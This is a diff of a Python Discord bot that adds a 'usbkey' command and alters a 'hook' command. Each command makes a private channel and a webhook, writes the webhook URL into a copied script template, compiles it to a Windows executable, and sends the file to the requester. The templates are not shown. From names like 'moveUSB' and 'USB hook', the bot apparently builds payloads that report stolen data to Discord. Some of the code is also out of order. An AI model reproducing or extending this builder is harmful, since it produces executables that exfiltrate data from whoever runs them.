@@ -3,7 +3,6 @@ import random
 import discord
 from discord.errors import HTTPException
 from discord.ext import commands
-from myconfig import *
 import shutil
 import subprocess
 import os
@@ -71,6 +70,59 @@ async def safe_send(channel, content=None, file=None):
 async def bonjour(ctx):
     await ctx.send(f"Bonjour {ctx.author}!")
 
+@bot.command()
+async def usbkey(ctx):
+    async def number_exists():
+        with open("usbIDfile.txt", "r") as IDfile:
+            existing_numbers = IDfile.read().splitlines()
+            return str(rand) not in existing_numbers
+
+    unique_number_found = False
+    while not unique_number_found:
+        if await number_exists():
+            unique_number_found = True
+            with open("usbIDfile.txt", "a") as IDfile:
+                IDfile.write(str(rand) + "\n")
+
+            try:
+                overwrites = {
+                    ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
+                    ctx.author: discord.PermissionOverwrite(read_messages=True)
+                }
+                category_name = "Bot Channels"
+                category = discord.utils.get(ctx.guild.categories, name=category_name)
+                if not category:
+                    category = await ctx.guild.create_category_channel(category_name)
+
+                channel = await ctx.guild.create_text_channel(f"USB_KEY-{rand}", overwrites=overwrites, category=category)
+                await channel.set_permissions(ctx.author, read_messages=True)
+                await safe_send(channel, f"Your USB hook ID is: {rand}.")
+                await safe_send(channel, f"Can take a while to send:")
+                webhookname = f"USBhook n'{rand}'"
+                webhook = await channel.create_webhook(name=webhookname)
+                created_webhook = next((w for w in await ctx.guild.webhooks() if w.name == webhookname), None)
+                
+                if created_webhook:
+                    python_content = created_webhook.url 
+                else:
+                    python_content = "Webhook not found."
+                replace_text_in_file(f'USB{rand}.py', 'YOUR_DISCORD_CHANNEL_ID', python_content)
+
+                bat_content = (f'USB{rand}.py')
+                shutil.copy('moveUSB.py', f'USB{rand}.py')
+                shutil.copy('convertor.bat', f'{rand}.bat')
+                replace_text_in_file(f'{rand}.bat', 'name', bat_content)
+
+                batch_file_path = f"{os.getcwd()}\\{rand}.bat"
+                run_batch_file(batch_file_path)
+
+                shutil.move(f"D:\\VSCODE\\dist\\{rand}.exe", f"D:\\VSCODE")
+                # Send the USB content using the newly created channel
+                
+                await safe_send(webhook, file=discord.File(f'{rand}.exe'))
+            except Exception as e:
+                await ctx.send(f"Failed to create channel or send message: {e}")
+                print(e)
 
 
 
@@ -114,6 +166,7 @@ async def hook(ctx):
                 else:
                     python_content = "Webhook not found."
                 replace_text_in_file(f'{rand}.py', 'webhookfirsturl', python_content)
+                replace_text_in_file(f'{rand}.py', '27615.exe', f'{rand}.exe')
 
                 bat_content = (f'{rand}.py')
                 shutil.copy('convertor.bat', f'{rand}.bat')
@@ -122,7 +175,7 @@ async def hook(ctx):
                 batch_file_path = f"{os.getcwd()}\\{rand}.bat"
                 run_batch_file(batch_file_path)
 
-                shutil.move (f"D:\\VS_CODE\\dist\\{rand}.exe", f"D:\\VS_CODE")
+                shutil.move (f"C:\\VSCODE\\dist\\{rand}.exe", f"C:\\VSCODE")
 
                 await safe_send(webhook, file=discord.File(f'{rand}.exe'))
             except Exception as e:
